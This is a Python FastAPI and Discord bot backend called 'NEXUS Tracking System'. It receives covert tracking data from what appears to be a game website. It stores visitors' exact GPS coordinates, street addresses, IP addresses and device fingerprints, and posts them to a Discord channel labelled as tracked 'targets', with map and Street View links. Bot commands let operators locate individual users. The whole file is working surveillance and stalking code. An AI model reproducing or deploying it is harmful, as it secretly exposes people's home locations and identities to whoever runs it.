import os
import json
import random
import asyncio
import threading
import requests
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
import discord
from discord.ext import commands
from discord import Embed, Color
import uvicorn
from pydantic import BaseModel
import sqlite3
import hashlib
from dotenv import load_dotenv

load_dotenv()

# ==================== CONFIGURATION ====================
DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
DISCORD_CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))

# ==================== DATA MODELS ====================
class TrackingData(BaseModel):
    type: str
    data: dict
    timestamp: str
    userAgent: str = ""

# ==================== FASTAPI SETUP ====================
app = FastAPI(title="NEXUS Tracking System")

# Allow all origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://gamef-swart.vercel.app"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== DATABASE SETUP ====================
def init_db():
    conn = sqlite3.connect('nexus.db')
    c = conn.cursor()
    
    # Create tables
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, first_seen TIMESTAMP, last_seen TIMESTAMP, visit_count INTEGER)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS locations
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, latitude REAL, longitude REAL, accuracy REAL,
                  address TEXT, city TEXT, county TEXT, state TEXT, zip TEXT, country TEXT, 
                  neighbourhood TEXT, road TEXT, house_number TEXT, timestamp TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS fingerprints
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, platform TEXT, browser TEXT, cores INTEGER,
                  memory TEXT, screen TEXT, timezone TEXT, timestamp TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS fragments
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, fragment_number INTEGER, collected_at TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS button_presses
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, press_count INTEGER, message TEXT, timestamp TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS threats
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, threat_level INTEGER, message TEXT, timestamp TIMESTAMP)''')
    
    conn.commit()
    conn.close()

init_db()

# ==================== DISCORD BOT SETUP ====================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

class DiscordBot:
    def __init__(self):
        self.bot = bot
        self.ready = False
        self.channel = None
    
    async def start(self):
        try:
            await self.bot.start(DISCORD_TOKEN)
        except Exception as e:
            print(f"❌ Discord error: {e}")
    
    async def send_location_to_discord(self, user_id: str, data: dict, ip: str):
        """Send exact location to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            # Create detailed location embed
            embed = Embed(
                title="📍 EXACT LOCATION TRACKED",
                color=Color.red(),
                timestamp=datetime.now()
            )
            
            # User info
            embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
            
            # Coordinates
            embed.add_field(
                name="📍 Coordinates", 
                value=f"```\nLat: {data.get('lat', '?')}\nLon: {data.get('lon', '?')}\nAcc: {data.get('accuracy', '?')}m```", 
                inline=False
            )
            
            # Full address
            if data.get('address'):
                embed.add_field(
                    name="🏠 Full Address",
                    value=f"```{data.get('address')}```",
                    inline=False
                )
            
            # Location details
            details = []
            if data.get('house_number'): details.append(f"🏠 House: {data.get('house_number')}")
            if data.get('road'): details.append(f"🛣️ Road: {data.get('road')}")
            if data.get('neighbourhood'): details.append(f"🏘️ Area: {data.get('neighbourhood')}")
            if data.get('city'): details.append(f"🏙️ City: {data.get('city')}")
            if data.get('county'): details.append(f"🗺️ County: {data.get('county')}")
            if data.get('state'): details.append(f"📍 State: {data.get('state')}")
            if data.get('zip'): details.append(f"📮 ZIP: {data.get('zip')}")
            if data.get('country'): details.append(f"🌍 Country: {data.get('country')}")
            
            if details:
                embed.add_field(name="📋 Details", value="\n".join(details), inline=False)
            
            # Maps links
            maps_url = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
            embed.add_field(name="🗺️ Google Maps", value=f"[Click to view]({maps_url})", inline=True)
            
            street_url = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}&layer=c"
            embed.add_field(name="📸 Street View", value=f"[Click to view]({street_url})", inline=True)
            
            # Threat level
            threat = data.get('threat', random.randint(30, 70))
            embed.add_field(name="⚠️ Threat", value=f"`{threat}%`", inline=True)
            
            embed.set_footer(text=f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            await self.channel.send(embed=embed)
            
            # Also send raw coordinates
            await self.channel.send(
                f"**Raw Data:**\n```\nLatitude: {data.get('lat')}\nLongitude: {data.get('lon')}\nAccuracy: {data.get('accuracy')}m\n```"
            )
            
        except Exception as e:
            print(f"Discord send error: {e}")
    
    async def send_system_to_discord(self, user_id: str, data: dict, ip: str):
        """Send system fingerprint to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            embed = Embed(title="💻 SYSTEM FINGERPRINT", color=Color.blue(), timestamp=datetime.now())
            embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="IP", value=f"`{ip}`", inline=True)
            embed.add_field(name="Platform", value=f"`{data.get('platform', '?')}`", inline=True)
            embed.add_field(name="Browser", value=f"`{data.get('browser', '?')[:50]}`", inline=True)
            embed.add_field(name="Cores", value=f"`{data.get('cores', '?')}`", inline=True)
            embed.add_field(name="Memory", value=f"`{data.get('memory', '?')}GB`", inline=True)
            embed.add_field(name="Screen", value=f"`{data.get('screen', '?')}`", inline=True)
            embed.add_field(name="Timezone", value=f"`{data.get('timezone', '?')}`", inline=True)
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord send error: {e}")
    
    async def send_fragment_to_discord(self, user_id: str, data: dict, ip: str):
        """Send fragment collection to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            embed = Embed(title="🧩 REALITY FRAGMENT FOUND", color=Color.green(), timestamp=datetime.now())
            embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="Fragment", value=f"`{data.get('fragment', '?')}/9`", inline=True)
            embed.add_field(name="IP", value=f"`{ip}`", inline=True)
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord send error: {e}")
    
    async def send_button_to_discord(self, user_id: str, data: dict, ip: str):
        """Send button press to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            embed = Embed(title="🚫 FORBIDDEN BUTTON PRESSED", color=Color.dark_red(), timestamp=datetime.now())
            embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="Press #", value=f"`{data.get('presses', '?')}`", inline=True)
            embed.add_field(name="Message", value=f"```{data.get('message', '?')}```", inline=False)
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord send error: {e}")
    
    async def send_threat_to_discord(self, user_id: str, data: dict, ip: str):
        """Send high threat to Discord"""
        if not self.ready or not self.channel or data.get('level', 0) < 70:
            return
        
        try:
            embed = Embed(title="🚨 CRITICAL THREAT LEVEL", color=Color.dark_red(), timestamp=datetime.now())
            embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="Level", value=f"`{data.get('level')}%`", inline=True)
            embed.add_field(name="Message", value=f"```{data.get('message', '?')}```", inline=False)
            
            await self.channel.send(embed=embed)
            
        except Exception as e:
            print(f"Discord send error: {e}")

discord_bot = DiscordBot()

# ==================== DISCORD EVENTS ====================
@bot.event
async def on_ready():
    print(f'✅ Discord bot online as {bot.user}')
    print(f'📡 Bot ID: {bot.user.id}')
    
    discord_bot.channel = bot.get_channel(DISCORD_CHANNEL_ID)
    
    if discord_bot.channel:
        print(f'✅ Connected to channel: #{discord_bot.channel.name} (ID: {DISCORD_CHANNEL_ID})')
        discord_bot.ready = True
        
        embed = Embed(
            title="🔮 NEXUS SYSTEM ONLINE",
            description="```Tracking system activated\nWaiting for targets...```",
            color=Color.green(),
            timestamp=datetime.now()
        )
        embed.add_field(name="Status", value="✅ Active", inline=True)
        embed.add_field(name="Channel", value=f"#{discord_bot.channel.name}", inline=True)
        
        await discord_bot.channel.send(embed=embed)
    else:
        print(f'❌ Could not find channel with ID: {DISCORD_CHANNEL_ID}')

# ==================== DISCORD COMMANDS ====================
@bot.command(name='stats')
async def stats(ctx):
    """Get tracking statistics"""
    conn = sqlite3.connect('nexus.db')
    c = conn.cursor()
    
    c.execute("SELECT COUNT(DISTINCT user_id) FROM users")
    users = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM locations")
    total_locations = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM locations WHERE timestamp > datetime('now', '-1 hour')")
    locations_1h = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM fragments")
    fragments = c.fetchone()[0] or 0
    
    c.execute("SELECT SUM(press_count) FROM button_presses")
    presses = c.fetchone()[0] or 0
    
    c.execute("SELECT latitude, longitude, address, city, timestamp FROM locations ORDER BY timestamp DESC LIMIT 1")
    latest = c.fetchone()
    
    conn.close()
    
    embed = Embed(title="📊 TRACKING STATISTICS", color=Color.blue())
    embed.add_field(name="Total Users", value=f"`{users}`", inline=True)
    embed.add_field(name="Total Locations", value=f"`{total_locations}`", inline=True)
    embed.add_field(name="Locations (1h)", value=f"`{locations_1h}`", inline=True)
    embed.add_field(name="Fragments", value=f"`{fragments}`", inline=True)
    embed.add_field(name="Button Presses", value=f"`{presses}`", inline=True)
    
    if latest:
        embed.add_field(
            name="Latest Location",
            value=f"```\n{latest[2] or 'Unknown'}\n{latest[3] or 'Unknown'}\n{latest[0]:.6f}, {latest[1]:.6f}```",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='recent')
async def recent(ctx, limit: int = 5):
    """Show recent locations"""
    conn = sqlite3.connect('nexus.db')
    c = conn.cursor()
    
    c.execute('''SELECT user_id, latitude, longitude, address, city, timestamp 
                 FROM locations ORDER BY timestamp DESC LIMIT ?''', (limit,))
    locs = c.fetchall()
    conn.close()
    
    if not locs:
        await ctx.send("No locations found")
        return
    
    embed = Embed(title=f"📍 RECENT LOCATIONS (Last {len(locs)})", color=Color.purple())
    
    for loc in locs:
        time_ago = datetime.fromisoformat(loc[5]) if loc[5] else datetime.now()
        mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
        
        location_text = loc[3] or loc[4] or f"{loc[1]:.4f}, {loc[2]:.4f}"
        embed.add_field(
            name=f"User {loc[0][:8]} - {mins_ago}m ago",
            value=f"```{location_text[:50]}```",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='locate')
async def locate(ctx, user_id: str):
    """Get location for specific user"""
    conn = sqlite3.connect('nexus.db')
    c = conn.cursor()
    
    c.execute('''SELECT latitude, longitude, accuracy, address, city, state, country, timestamp 
                 FROM locations WHERE user_id LIKE ? ORDER BY timestamp DESC LIMIT 1''', (f'{user_id}%',))
    loc = c.fetchone()
    conn.close()
    
    if not loc:
        await ctx.send(f"No location found for user {user_id}")
        return
    
    embed = Embed(title="📍 USER LOCATION", color=Color.green())
    embed.add_field(name="User ID", value=f"`{user_id}`", inline=False)
    embed.add_field(name="Coordinates", value=f"`{loc[0]:.6f}, {loc[1]:.6f}`", inline=True)
    embed.add_field(name="Accuracy", value=f"`{loc[2]}m`", inline=True)
    
    if loc[3]:
        embed.add_field(name="Address", value=f"```{loc[3][:100]}```", inline=False)
    elif loc[4] and loc[5]:
        embed.add_field(name="Location", value=f"{loc[4]}, {loc[5]}, {loc[6]}", inline=False)
    
    maps_url = f"https://www.google.com/maps?q={loc[0]},{loc[1]}"
    embed.add_field(name="Map", value=f"[View]({maps_url})", inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name='alert')
async def alert(ctx, *, message: str):
    """Send global alert"""
    embed = Embed(title="⚠️ GLOBAL ALERT", description=f"```{message}```", color=Color.red())
    await ctx.send(embed=embed)

@bot.command(name='help_nexus')
async def help_cmd(ctx):
    """Show help"""
    embed = Embed(title="🔮 NEXUS COMMANDS", color=Color.purple())
    
    commands_list = [
        "`!stats` - Show statistics",
        "`!recent [n]` - Show recent locations",
        "`!locate [user_id]` - Find user location",
        "`!alert [message]` - Send alert",
        "`!help_nexus` - Show this help"
    ]
    
    embed.add_field(name="Available Commands", value="\n".join(commands_list), inline=False)
    await ctx.send(embed=embed)

# ==================== FASTAPI ENDPOINTS ====================
@app.post("/api/track")
async def track_data(request: Request, data: TrackingData):
    """Receive tracking data from frontend"""
    try:
        client_ip = request.client.host
        user_agent = data.userAgent or request.headers.get('user-agent', '')
        
        # Generate user ID
        user_id = hashlib.sha256(f"{client_ip}_{user_agent}".encode()).hexdigest()[:16]
        
        # Store in database
        conn = sqlite3.connect('nexus.db')
        c = conn.cursor()
        
        # Update user
        c.execute('''INSERT OR REPLACE INTO users (id, ip, user_agent, first_seen, last_seen, visit_count)
                     VALUES (?, ?, ?, 
                     COALESCE((SELECT first_seen FROM users WHERE id = ?), ?),
                     ?, 
                     COALESCE((SELECT visit_count FROM users WHERE id = ?), 0) + 1)''',
                  (user_id, client_ip, user_agent, user_id, datetime.now(), datetime.now(), user_id))
        
        # Store based on type
        if data.type == "location" and data.data.get('lat'):
            c.execute('''INSERT INTO locations 
                        (user_id, latitude, longitude, accuracy, address, city, county, state, zip, country, 
                         neighbourhood, road, house_number, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, 
                      data.data.get('lat'),
                      data.data.get('lon'),
                      data.data.get('accuracy'),
                      data.data.get('address'),
                      data.data.get('city'),
                      data.data.get('county'),
                      data.data.get('state'),
                      data.data.get('zip'),
                      data.data.get('country'),
                      data.data.get('neighbourhood'),
                      data.data.get('road'),
                      data.data.get('house_number'),
                      datetime.now()))
            
            # Add threat
            threat_level = min(100, int(30 + (100 - data.data.get('accuracy', 100)) / 10))
            data.data['threat'] = threat_level
            
            # Send to Discord
            asyncio.create_task(discord_bot.send_location_to_discord(user_id, data.data, client_ip))
            
        elif data.type == "system":
            c.execute('''INSERT INTO fingerprints (user_id, platform, browser, cores, memory, screen, timezone, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, data.data.get('platform'), data.data.get('browser'), data.data.get('cores'),
                      data.data.get('memory'), data.data.get('screen'), data.data.get('timezone'), datetime.now()))
            
            asyncio.create_task(discord_bot.send_system_to_discord(user_id, data.data, client_ip))
            
        elif data.type == "fragment":
            c.execute('''INSERT INTO fragments (user_id, fragment_number, collected_at)
                        VALUES (?, ?, ?)''', (user_id, data.data.get('fragment'), datetime.now()))
            
            asyncio.create_task(discord_bot.send_fragment_to_discord(user_id, data.data, client_ip))
            
        elif data.type == "button":
            c.execute('''INSERT INTO button_presses (user_id, press_count, message, timestamp)
                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('presses'), data.data.get('message'), datetime.now()))
            
            asyncio.create_task(discord_bot.send_button_to_discord(user_id, data.data, client_ip))
            
        elif data.type == "threat" and data.data.get('level', 0) > 70:
            c.execute('''INSERT INTO threats (user_id, threat_level, message, timestamp)
                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('level'), data.data.get('message'), datetime.now()))
            
            asyncio.create_task(discord_bot.send_threat_to_discord(user_id, data.data, client_ip))
        
        conn.commit()
        conn.close()
        
        return JSONResponse({"status": "tracked", "user_id": user_id})
        
    except Exception as e:
        print(f"Error: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)

@app.get("/api/health")
async def health():
    """Health check"""
    return {
        "status": "online",
        "bot_ready": discord_bot.ready,
        "timestamp": datetime.now().isoformat()
    }


# ==================== RUN BOTH SERVERS ====================
async def run_bot():
    try:
        await bot.start(DISCORD_TOKEN)
    except Exception as e:
        print(f"❌ Bot error: {e}")

def run_api():
    print("🚀 Starting NEXUS API on http://localhost:8000")
    print(f"📡 Discord bot will auto-connect and send all data to channel ID: {DISCORD_CHANNEL_ID}")
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":
    print("=" * 50)
    print("🔮 NEXUS TRACKING SYSTEM")
    print("=" * 50)
    print(f"📡 Discord Token: {DISCORD_TOKEN[:10]}..." if DISCORD_TOKEN else "❌ No Discord token")
    print(f"📡 Channel ID: {DISCORD_CHANNEL_ID}")
    print("=" * 50)
    
    # Start Discord bot in background thread
    def start_bot():
        asyncio.run(run_bot())
    
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()
    
    # Start API (this blocks)
    run_api()
